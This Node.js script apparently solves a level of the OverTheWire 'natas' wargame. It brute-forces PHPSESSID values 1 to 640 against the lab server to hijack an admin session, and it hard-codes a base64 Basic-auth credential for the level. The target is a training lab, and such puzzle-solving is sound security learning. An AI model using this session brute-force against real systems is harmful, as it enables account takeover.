const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

async function req(ch) {
    const headers = {
        'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==',
        'Cookie': `PHPSESSID=${ch}`
    }
    const res = await axios.post(`http://natas18.natas.labs.overthewire.org/index.php?debug=1`, `username=natas19`, {headers, withCredentials: true});
    console.log(`For sessionId = ${ch}`);
    if(res.data.includes('regular')) {
        return false;
    } else {
        console.log(res.data);
        return true;
    }
}

async function calc() {
    for(let i=1; i<=640; i++) {
        let val = await req(i);
        if(val) {
            break;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));